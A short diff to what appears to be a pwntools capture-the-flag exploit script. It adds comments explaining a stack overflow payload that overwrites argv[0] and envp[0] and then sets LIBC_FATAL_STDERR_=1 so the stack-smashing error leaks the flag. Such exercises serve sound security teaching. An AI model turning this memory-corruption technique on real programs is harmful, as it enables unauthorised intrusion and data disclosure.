@@ -50,11 +50,15 @@ if __name__ == "__main__":
 # 0x600d20 is obvious.
 # 0x400d20... Why does ELF loader duplicate the string? I will figure it out later (binfmt_elf.c)
 
+    # overwrite argv[0] & envp[0]
     payload = "A" * 0x218 + p64(0x400d20) + p64(0) + p64(0x600d20) + '\n'
     r.send(payload)
     
     junk += r.recvuntil("Please overwrite the flag: ")
-    r.sendline("LIBC_FATAL_STDERR_=1\0") # StackOverflow, "How to redirect RUNTIME ERRORS to STDERR?"
+    # now envp[0] is 0x600d20
+    # and LIBC_FATAL_STDERR_=1 will be written to envp[0]
+    # StackOverflow, "How to redirect RUNTIME ERRORS to STDERR?"
+    r.sendline("LIBC_FATAL_STDERR_=1\0") 
 
     junk += r.recvall()
     print junk
